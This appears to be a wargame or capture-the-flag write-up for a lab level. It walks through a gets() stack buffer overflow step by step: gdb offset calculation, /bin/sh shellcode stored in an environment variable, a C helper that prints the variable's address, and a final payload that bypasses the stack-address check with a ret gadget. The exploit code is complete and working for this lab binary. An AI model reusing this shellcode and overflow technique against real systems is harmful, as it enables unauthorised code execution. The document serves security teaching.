This program waits for an input and rewrite it in stdout with `puts` function and then exits. 

Just like the previous level, we want to segfault the programm by doing an overflow on `gets` function used in `p`.

We notice that if we want to go in the `if` condition, we have to give a specific adress : 

>  0x08048500 <+44>:	cmp    $0xb0000000,%eax

The adress is suppposed to be equal to `0xb0000000`, but no adress in the stack looks like this. So, if we want to pass the adress of something here, it has to be stored elsewhere.

First, we calculate the offset from the `eax` of `gets` to the `eip` of the `CMP` operation to know how much we have to overflow :

We put the first breakpoint right after the `gets` function :

> (gdb) br *0x080484f2   
> Breakpoint 1 at 0x80484f2

And a second breakpoint in the `CMP` operation :

>(gdb) br *0x08048500   
>Breakpoint 2 at 0x8048500

Then we run the program, and deduct the `eip` address from the `eax` address :

```
(gdb) r
Starting program: /home/user/level2/level2 


Breakpoint 1, 0x080484f2 in p ()
(gdb) x $eax
0xbffff6cc:	0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x08048500 in p ()
(gdb) info frame
Stack level 0, frame at 0xbffff720:
 eip = 0x8048500 in p; saved eip 0x804854a
 called by frame at 0xbffff730
 Arglist at 0xbffff718, args: 
 Locals at 0xbffff718, Previous frame's sp is 0xbffff720
 Saved registers:
  ebp at 0xbffff718, eip at 0xbffff71c
(gdb) p 0xbffff71c - 0xbffff6cc
$1 = 80
```

We now know that we have to overflow with 80 characters !

Since we cannot store a shellcode opening a shell in the stack, we are going to store it in the env :

```
export SHELLCODE=`python -c 'print("\x90"*200+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'`
```

We put 200 'nop' instructions before the shellcode.


We write a small program in `/tmp` to print the address of the env variable :

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    char* ptr = getenv("SHELLCODE");
    printf("%p\n", ptr);
}
```

Now we write our exploit :

`(python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\xd2\xf8\xff\xbf"' ; cat) | ./level2`

Overflow of 80 char + address of the ret of `p` function + address of the shellcode

# Sources :

Where to find the shellcode :
- https://beta.hackndo.com/buffer-overflow/#pratique
